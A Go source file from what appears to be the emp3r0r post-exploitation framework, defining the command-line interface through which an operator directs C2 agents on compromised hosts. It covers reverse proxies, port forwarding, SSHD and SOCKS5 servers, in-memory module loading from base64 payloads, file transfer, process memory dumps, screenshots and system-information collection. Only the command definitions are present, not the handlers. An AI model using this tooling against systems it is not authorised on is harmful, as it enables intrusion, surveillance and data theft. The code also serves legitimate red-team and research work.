package handler

import (
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// C2Commands returns a root cobra.Command for C2 commands.
func C2Commands() *cobra.Command {
	rootCmd := &cobra.Command{
		Short: "agent C2 commands",
	}

	// Add command groups for categorization
	rootCmd.AddGroup(
		&cobra.Group{ID: "generic", Title: "Generic Commands"},
		&cobra.Group{ID: "linux", Title: "Linux Commands"},
		&cobra.Group{ID: "windows", Title: "Windows Commands"},
	)
	rootCmd.PersistentFlags().StringP("cmd_id", "", "", "Command ID")

	// Generic commands group
	lsCmd := &cobra.Command{
		Use:     def.C2CmdListDir,
		Short:   "List directory entries",
		Example: "!ls --path <path>",
		GroupID: "generic",
		Run:     runListDir,
	}
	lsCmd.Flags().StringP("path", "p", "", "Path to list")
	lsCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(lsCmd)

	// C2 Stat command
	statCmd := &cobra.Command{
		Use:     def.C2CmdStat,
		Short:   "Retrieve file statistics",
		Example: "!stat --path <path>",
		GroupID: "generic",
		Run:     runStat,
	}
	statCmd.Flags().StringP("path", "p", "", "Path to stat")
	statCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(statCmd)

	// C2 Bring2CC command
	bring2ccCmd := &cobra.Command{
		Use:     def.C2CmdBring2CC,
		Short:   "Setup reverse proxy",
		Example: "!bring2cc --addr <target> --kcp <on/off>",
		GroupID: "generic",
		Run:     runBring2CC,
	}
	bring2ccCmd.Flags().StringP("addr", "a", "", "Target agent IP address")
	bring2ccCmd.Flags().StringP("kcp", "k", "off", "Use KCP for reverse proxy (on/off)")
	rootCmd.AddCommand(bring2ccCmd)

	// C2 SSHD command
	sshdCmd := &cobra.Command{
		Use:     def.C2CmdSSHD,
		Short:   "Start an SSHD server",
		Example: "!sshd --shell <shell> --port <port> --args <args>",
		GroupID: "generic",
		Run:     runSSHD,
	}
	sshdCmd.Flags().StringP("shell", "s", "", "Shell to use")
	sshdCmd.Flags().StringP("port", "p", "", "Port to use")
	sshdCmd.Flags().StringSliceP("args", "a", []string{}, "Arguments for SSHD")
	rootCmd.AddCommand(sshdCmd)

	// C2 Proxy command
	proxyCmd := &cobra.Command{
		Use:     def.C2CmdProxy,
		Short:   "Start a Socks5 proxy",
		Example: "!proxy --mode <mode> --addr <address>",
		GroupID: "generic",
		Run:     runProxy,
	}
	proxyCmd.Flags().StringP("mode", "m", "", "Proxy mode")
	proxyCmd.Flags().StringP("addr", "a", "", "Address to bind")
	rootCmd.AddCommand(proxyCmd)

	// C2 Put command
	putCmd := &cobra.Command{
		Use:     "put",
		Short:   "Upload file to agent",
		Example: "!put --path <path> --addr <url> --mem <bool> --force <bool>",
		GroupID: "generic",
		Run:     putCmdRun,
	}
	putCmd.Flags().StringP("path", "p", "", "Path to save file on agent")
	putCmd.Flags().StringP("addr", "", "", "Download address")
	putCmd.Flags().BoolP("mem", "m", false, "Save file to memory")
	putCmd.Flags().BoolP("force", "", false, "Force write to disk if memory is unavailable")
	putCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(putCmd)

	// C2 Port Forwarding command
	portFwdCmd := &cobra.Command{
		Use:     def.C2CmdPortFwd,
		Short:   "Setup port forwarding",
		Example: "!port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>",
		GroupID: "generic",
		Run:     runPortFwd,
	}
	portFwdCmd.Flags().StringP("to", "t", "", "Target address")
	portFwdCmd.Flags().StringP("shID", "s", "", "Session ID")
	portFwdCmd.Flags().StringP("operation", "o", "", "Operation type")
	portFwdCmd.Flags().IntP("timeout", "T", 0, "Timeout")
	rootCmd.AddCommand(portFwdCmd)

	// C2 Delete Port Forwarding command
	deletePortFwdCmd := &cobra.Command{
		Use:     def.C2CmdDeletePortFwd,
		Short:   "Delete port forwarding session",
		Example: "!delete_portfwd --id <session_id>",
		GroupID: "generic",
		Run:     runDeletePortFwd,
	}
	deletePortFwdCmd.Flags().StringP("id", "i", "", "Session ID")
	rootCmd.AddCommand(deletePortFwdCmd)

	// C2 Custom Module command
	customModuleCmd := &cobra.Command{
		Use:     def.C2CmdCustomModule,
		Short:   "Load a custom module",
		Example: "!custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>",
		GroupID: "generic",
		Run:     runCustomModule,
	}
	customModuleCmd.Flags().StringP("mod_name", "m", "", "Module name")
	customModuleCmd.Flags().StringP("invocation", "v", "", "Base64-encoded invocation payload")
	customModuleCmd.Flags().StringP("checksum", "c", "", "Checksum")
	customModuleCmd.Flags().BoolP("in_mem", "i", false, "Load module in memory")
	customModuleCmd.Flags().StringP("type", "t", "", "Payload type")
	customModuleCmd.Flags().StringP("file_to_download", "f", "", "File to download")
	customModuleCmd.RegisterFlagCompletionFunc("file_to_download", memFileCompletion)
	customModuleCmd.Flags().StringP("download_addr", "d", "", "Download address")
	rootCmd.AddCommand(customModuleCmd)

	// C2 Listener command
	listenerCmd := &cobra.Command{
		Use:     def.C2CmdListener,
		Short:   "Start a listener",
		Example: "!listener --listener <listener> --port <port> --payload <payload> --compression <on/off> --passphrase <passphrase>",
		GroupID: "generic",
		Run:     runListener,
	}
	listenerCmd.Flags().StringP("listener", "l", "http_aes_compressed", "Listener type: http_aes_compressed, tcp_aes_compressed, udp_aes_compressed")
	listenerCmd.Flags().StringP("port", "p", "8000", "Port")
	listenerCmd.Flags().StringP("payload", "P", "", "Payload")
	listenerCmd.Flags().StringP("compression", "c", "on", "Compression (on/off)")
	listenerCmd.Flags().StringP("passphrase", "s", "my_secret_key", "Passphrase")
	rootCmd.AddCommand(listenerCmd)

	// C2 File Server command
	fileServerCmd := &cobra.Command{
		Use:     def.C2CmdFileServer,
		Short:   "Start file server",
		Example: "!file_server --port <port> --switch <on/off>",
		GroupID: "generic",
		Run:     runFileServer,
	}
	fileServerCmd.Flags().StringP("port", "p", "8000", "Port")
	fileServerCmd.Flags().StringP("switch", "s", "on", "Switch (on/off)")
	rootCmd.AddCommand(fileServerCmd)

	// C2 File Downloader command
	fileDownloaderCmd := &cobra.Command{
		Use:     def.C2CmdFileDownloader,
		Short:   "Download file",
		Example: "!file_downloader --download_addr <url> --path <path> --checksum <checksum>",
		GroupID: "generic",
		Run:     runFileDownloader,
	}
	fileDownloaderCmd.Flags().StringP("download_addr", "u", "", "URL to download")
	fileDownloaderCmd.Flags().StringP("path", "p", "", "Path to save")
	fileDownloaderCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	fileDownloaderCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(fileDownloaderCmd)

	// C2 Memory Dump command
	memDumpCmd := &cobra.Command{
		Use:     def.C2CmdMemDump,
		Short:   "Memory dump",
		Example: "!mem_dump --pid <pid>",
		GroupID: "generic",
		Run:     runMemDump,
	}
	memDumpCmd.Flags().IntP("pid", "p", 0, "PID of target process")
	rootCmd.AddCommand(memDumpCmd)

	screenshotCmd := &cobra.Command{
		Use:     def.C2CmdScreenshot,
		Short:   "Take screenshot",
		GroupID: "generic",
		Run:     screenshotCmdRun,
	}
	rootCmd.AddCommand(screenshotCmd)

	sysInfoCmd := &cobra.Command{
		Use:     def.C2CmdSysInfo,
		Short:   "Collect full system info",
		GroupID: "generic",
		Run:     runSysInfo,
	}
	rootCmd.AddCommand(sysInfoCmd)

	platformCommands(rootCmd)

	return rootCmd
}

// memFileCompletion completes mem:// paths
func memFileCompletion(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
	if strings.HasPrefix(toComplete, "mem://") {
		return util.ListMemFiles(), cobra.ShellCompDirectiveNoFileComp
	}
	return nil, cobra.ShellCompDirectiveDefault
}
